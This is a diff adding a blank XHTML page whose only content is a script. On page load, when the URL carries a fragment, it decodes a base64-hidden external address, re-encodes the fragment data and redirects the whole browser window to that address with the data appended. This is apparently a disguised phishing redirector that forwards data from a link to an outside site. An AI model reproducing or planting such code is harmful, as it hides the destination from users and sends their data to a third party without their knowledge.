@@ -1,0 +1,30 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
+    <title>.</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+</head>
+
+<body>
+    <h1></h1>
+<script type="text/javascript">
+
+ if (window.location.hash){
+  var link = window.atob("aHR0cHM6Ly93d3cua29ndW1hcmVjb3JkLm9yZy9tcDMvbXAzLw==");
+  var hash = btoa(getProcessHash());
+  window.top.location.href=`${link}/${hash}`;
+ }
+
+ function getProcessHash(){
+     if(window.location.hash){
+         let h = window.location.hash;
+         let s = h.split('#')[1];
+         //let arr = JSON.parse(atob(s));
+
+         return atob(s);
+     }
+    }
+
+</script>
+</body>
+
+</html>
